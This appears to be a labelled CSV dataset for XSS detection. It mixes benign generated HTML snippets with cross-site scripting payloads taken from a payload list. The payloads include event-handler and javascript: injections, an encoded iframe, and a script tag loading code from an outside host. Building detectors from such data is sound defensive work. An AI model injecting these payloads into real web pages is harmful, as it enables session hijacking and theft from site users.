text,label,source,length,timestamp
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.737767
<tt id=x tabindex=1 onfocusin=alert(1)></tt>,1,payloadbox,44,2026-02-09T15:05:27.723765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.738766
"<button onkeyup=""alert(1)"" contenteditable>test</button>",1,payloadbox,56,2026-02-09T15:05:27.715767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.738766
"<p onclick=""alert(1)"">test</p>",1,payloadbox,30,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.741766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
<x onxxx=1 onxxx=1,1,payloadbox,18,2026-02-09T15:05:27.713767
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",1,payloadbox,51,2026-02-09T15:05:27.719771
"<IMG SRC=""javascript:alert('XSS');"">",1,payloadbox,36,2026-02-09T15:05:27.724768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.735774
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",1,payloadbox,105,2026-02-09T15:05:27.716766
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",1,payloadbox,176,2026-02-09T15:05:27.722765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.729765
"<ol oncontextmenu=""alert(1)"">test</ol>",1,payloadbox,38,2026-02-09T15:05:27.719771
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,1,payloadbox,69,2026-02-09T15:05:27.723765
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></legend>",1,payloadbox,182,2026-02-09T15:05:27.722765
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.732765
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1,payloadbox,60,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",1,payloadbox,89,2026-02-09T15:05:27.722765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.725769
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<svg><menuitem onload=alert(1)></menuitem>,1,payloadbox,42,2026-02-09T15:05:27.723765
"<body onmouseover=""alert(1)"">test</body>",1,payloadbox,40,2026-02-09T15:05:27.715767
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1,payloadbox,57,2026-02-09T15:05:27.717767
<span class='class-5954'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<span class='class-5074'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.727768
<span class='class-1864'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",1,payloadbox,100,2026-02-09T15:05:27.721766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
"<li onclick=""alert(1)"">test</li>",1,payloadbox,32,2026-02-09T15:05:27.718768
"<frame onkeypress=""alert(1)"" contenteditable>test</frame>",1,payloadbox,57,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.731765
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.715767
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.729765
"<input oncut=alert(1) value=""XSS"" autofocus>",1,payloadbox,44,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
"<dt onmousemove=""alert(1)"">test</dt>",1,payloadbox,36,2026-02-09T15:05:27.716766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.735774
"<style>:target {color: red;}</style><title id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></title>",1,payloadbox,113,2026-02-09T15:05:27.721766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.725769
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.734777
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationstart=""alert(1)""></output>",1,payloadbox,99,2026-02-09T15:05:27.722765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
"<rb onmousedown=""alert(1)"">test</rb>",1,payloadbox,36,2026-02-09T15:05:27.720768
"<strong oncut=""alert(1)"" contenteditable>test</strong>",1,payloadbox,54,2026-02-09T15:05:27.721766
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.715767
"<output oncopy=""alert(1)"" contenteditable>test</output>",1,payloadbox,55,2026-02-09T15:05:27.719771
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noscript>",1,payloadbox,186,2026-02-09T15:05:27.722765
"<cite onmouseover=""alert(1)"">test</cite>",1,payloadbox,40,2026-02-09T15:05:27.715767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.743765
<span class='class-5934'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",1,payloadbox,53,2026-02-09T15:05:27.718768
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",1,payloadbox,168,2026-02-09T15:05:27.721766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.742765
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,1,payloadbox,42,2026-02-09T15:05:27.724768
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",1,payloadbox,48,2026-02-09T15:05:27.723765
"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",1,payloadbox,62,2026-02-09T15:05:27.719771
"<sub oncontextmenu=""alert(1)"">test</sub>",1,payloadbox,40,2026-02-09T15:05:27.722765
"<footer draggable=""true"" ondrag=""alert(1)"">test</footer>",1,payloadbox,56,2026-02-09T15:05:27.717767
"<dd onbeforecut=""alert(1)"" contenteditable>test</dd>",1,payloadbox,52,2026-02-09T15:05:27.715767
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></spacer>",1,payloadbox,182,2026-02-09T15:05:27.722765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.725769
"<pre ondblclick=""alert(1)"">test</pre>",1,payloadbox,37,2026-02-09T15:05:27.719771
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",1,payloadbox,418,2026-02-09T15:05:27.725769
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.744765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.729765
<span class='class-1964'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.729765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",1,payloadbox,111,2026-02-09T15:05:27.716766
"<basefont onmouseout=""alert(1)"">test</basefont>",1,payloadbox,47,2026-02-09T15:05:27.714766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.729765
"<strike ondblclick=""alert(1)"">test</strike>",1,payloadbox,43,2026-02-09T15:05:27.721766
"<div id=""91"">[A]",1,payloadbox,16,2026-02-09T15:05:27.725769
"<param onmouseout=""alert(1)"">test</param>",1,payloadbox,41,2026-02-09T15:05:27.719771
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.733766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.726766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,1,payloadbox,51,2026-02-09T15:05:27.718768
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",1,payloadbox,95,2026-02-09T15:05:27.722765
"<iframe src=""http://example.org/""></iframe>",1,payloadbox,43,2026-02-09T15:05:27.725769
"<style>:target {transform: rotate(180deg);}</style><optgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></optgroup>",1,payloadbox,134,2026-02-09T15:05:27.721766
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,1,payloadbox,70,2026-02-09T15:05:27.720768
"<embed onmouseleave=""alert(1)"">test</embed>",1,payloadbox,43,2026-02-09T15:05:27.717767
<span class='class-5854'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.718768
"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",1,payloadbox,59,2026-02-09T15:05:27.719771
<span class='class-2784'>Services</span>,0,generated,40,2026-02-09T15:05:27.732765
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",1,payloadbox,61,2026-02-09T15:05:27.719771
"<p onmouseover=""alert(1)"">test</p>",1,payloadbox,34,2026-02-09T15:05:27.719771
<span class='class-6024'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.738766
"<element onmouseout=""alert(1)"">test</element>",1,payloadbox,45,2026-02-09T15:05:27.716766
"<rtc onmousedown=""alert(1)"">test</rtc>",1,payloadbox,38,2026-02-09T15:05:27.720768
"<optgroup oncopy=""alert(1)"" contenteditable>test</optgroup>",1,payloadbox,59,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.739765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.740766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",1,payloadbox,97,2026-02-09T15:05:27.722765
"<ul oncontextmenu=""alert(1)"">test</ul>",1,payloadbox,38,2026-02-09T15:05:27.724768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.731765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
<select onchange=alert(1)><option>1<option>2,1,payloadbox,44,2026-02-09T15:05:27.714766
"<tt onclick=""alert(1)"">test</tt>",1,payloadbox,32,2026-02-09T15:05:27.723765
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.720768
<span class='class-4514'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" ontransitionend=alert(1)></br>",1,payloadbox,102,2026-02-09T15:05:27.721766
<span class='class-534'>Services</span>,0,generated,39,2026-02-09T15:05:27.726766
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,1,payloadbox,72,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.737767
"<button oncut=""alert(1)"" contenteditable>test</button>",1,payloadbox,54,2026-02-09T15:05:27.715767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.734777
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
"<code onclick=""alert(1)"">test</code>",1,payloadbox,36,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
<span class='class-4584'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
<span class='class-6064'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
"<img onkeyup=""alert(1)"" contenteditable>test</img>",1,payloadbox,50,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
<article id=x tabindex=1 onfocus=alert(1)></article>,1,payloadbox,52,2026-02-09T15:05:27.714766
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1,payloadbox,61,2026-02-09T15:05:27.715767
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,1,payloadbox,60,2026-02-09T15:05:27.724768
<span class='class-4784'>Services</span>,0,generated,40,2026-02-09T15:05:27.739765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<span class='class-4904'>Services</span>,0,generated,40,2026-02-09T15:05:27.739765
"<th onmousemove=""alert(1)"">test</th>",1,payloadbox,36,2026-02-09T15:05:27.723765
"<frameset onmousemove=""alert(1)"">test</frameset>",1,payloadbox,48,2026-02-09T15:05:27.717767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.735774
"<br oncontextmenu=""alert(1)"">test</br>",1,payloadbox,38,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.726766
"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",1,payloadbox,61,2026-02-09T15:05:27.718768
<html ontouchmove=alert(1)>,1,payloadbox,27,2026-02-09T15:05:27.713767
"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",1,payloadbox,56,2026-02-09T15:05:27.721766
"<rt onclick=""alert(1)"">test</rt>",1,payloadbox,32,2026-02-09T15:05:27.720768
"<mark onmouseleave=""alert(1)"">test</mark>",1,payloadbox,41,2026-02-09T15:05:27.718768
"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",1,payloadbox,59,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.739765
<span class='class-5804'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,1,payloadbox,81,2026-02-09T15:05:27.719771
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,1,payloadbox,114,2026-02-09T15:05:27.724768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.724768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.738766
"<fieldset draggable=""true"" ondragleave=""alert(1)"">test</fieldset>",1,payloadbox,65,2026-02-09T15:05:27.717767
"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",1,payloadbox,122,2026-02-09T15:05:27.721766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,1,payloadbox,76,2026-02-09T15:05:27.718768
"<hgroup onkeypress=""alert(1)"" contenteditable>test</hgroup>",1,payloadbox,59,2026-02-09T15:05:27.717767
"<sup onmouseleave=""alert(1)"">test</sup>",1,payloadbox,39,2026-02-09T15:05:27.722765
"<i ondblclick=""alert(1)"">test</i>",1,payloadbox,33,2026-02-09T15:05:27.717767
"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",1,payloadbox,58,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
"<content onkeyup=""alert(1)"" contenteditable>test</content>",1,payloadbox,58,2026-02-09T15:05:27.715767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.737767
"<header onclick=""alert(1)"">test</header>",1,payloadbox,40,2026-02-09T15:05:27.717767
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,1,payloadbox,75,2026-02-09T15:05:27.714766
"<center oncopy=""alert(1)"" contenteditable>test</center>",1,payloadbox,55,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.733766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<span class='class-3614'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
"<svg onmouseout=""alert(1)"">test</svg>",1,payloadbox,37,2026-02-09T15:05:27.722765
"<thead draggable=""true"" ondragstart=""alert(1)"">test</thead>",1,payloadbox,59,2026-02-09T15:05:27.723765
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",1,payloadbox,57,2026-02-09T15:05:27.723765
<span class='class-1054'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",1,payloadbox,59,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
<dd id=x tabindex=1 onfocus=alert(1)></dd>,1,payloadbox,42,2026-02-09T15:05:27.715767
